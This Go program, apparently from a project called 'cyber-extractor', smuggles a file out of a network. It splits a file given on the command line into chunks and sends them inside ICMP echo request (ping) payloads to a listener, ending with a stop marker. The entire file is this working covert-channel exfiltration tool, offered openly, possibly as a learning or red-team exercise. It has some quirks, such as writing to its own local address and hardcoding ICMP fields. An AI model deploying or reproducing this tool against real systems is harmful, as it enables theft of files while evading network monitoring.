package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	icmpcommons "github.com/Anthony-Jhoiro/cyber-extractor/icmp"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"log"
	"math"
	"os"
	"time"
)

const (
	MaxPayloadSize = 65507
	// PingDelay delay between each ping in milliseconds. Otherwise, not all the ping cn be received
	PingDelay = 5
)

// noVerifySplitBytes is a simple split function that simply returns its content.
// It is just used to make reading bytes easier.
func noVerifySplitBytes(data []byte, atEOF bool) (advance int, token []byte, err error) {
	if atEOF && len(data) == 0 {
		return 0, nil, nil
	}
	return len(data), data, nil
}

//intTo4ByteArray cast an int into a array of 4 bytes
func intTo4ByteArray(i uint32) []byte {
	// Create an array of 4 bytes
	bs := make([]byte, 4)
	// Add the int in the byte array
	binary.LittleEndian.PutUint32(bs, i)
	return bs
}

// buildICMPEchoRequest build an ICMP echo request with the given data as a byte array
func buildICMPEchoRequest(id uint32, sequenceNumber uint32, data []byte) *icmp.Message {
	buff := new(bytes.Buffer)

	// Add the data elements to the buffer
	buff.Write(intTo4ByteArray(id))
	buff.Write(intTo4ByteArray(sequenceNumber))
	buff.Write(data)

	// Build the echo request
	body := &icmp.Echo{
		ID:   1,
		Seq:  2,
		Data: buff.Bytes(),
	}

	// Wrap the echo request in an icmp message that can be sent easily.
	return &icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: body,
	}
}

// sendData build and send an icmp echo request to the given connection with the given bytes
func sendData(conn *icmp.PacketConn, id uint32, seq uint32, data []byte) {
	log.Printf("Send [%d] - %d - %d bytes\n", id, seq, len(data))

	msg := buildICMPEchoRequest(id, seq, data)

	// Transform the message to a byte array
	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		panic(err)
	}

	_, err = conn.WriteTo(msgBytes, conn.LocalAddr())
	if err != nil {
		panic(err)
	}
}

func main() {
	// Get the destination and filename from the command line arguments
	destination := os.Args[1]
	filename := os.Args[2]

	// Generate an id from the timestamp and cast it to uint32
	id := uint32(time.Now().Unix() % math.MaxInt)

	// Create a connection to the given destination using udp4 to listen with no privilege.
	conn, err := icmp.ListenPacket("udp4", destination)
	if err != nil {
		panic(err)
	}

	// Open the file to send to the listener
	f, err := os.Open(filename)
	if err != nil {
		panic(err)
	}

	// Close the file when the program end
	defer f.Close()

	// fileReader makes it easier to read the file by bytes
	fileReader := bufio.NewReaderSize(f, MaxPayloadSize)

	// Create a scanner to parse the file
	scanner := bufio.NewScanner(fileReader)
	scanner.Split(noVerifySplitBytes)

	var sequenceCount uint32 = 1
	// Start scanning the file and for each read bytes, send it to the destination.
	for scanner.Scan() {
		sendData(conn, id, sequenceCount, scanner.Bytes())

		time.Sleep(PingDelay * time.Millisecond)
		sequenceCount += 1
	}

	sendData(conn, id, sequenceCount, icmpcommons.StopSequence)

	// If there has been an error reading the file displays it.
	if err = scanner.Err(); err != nil {
		log.Println(err)
	}
}
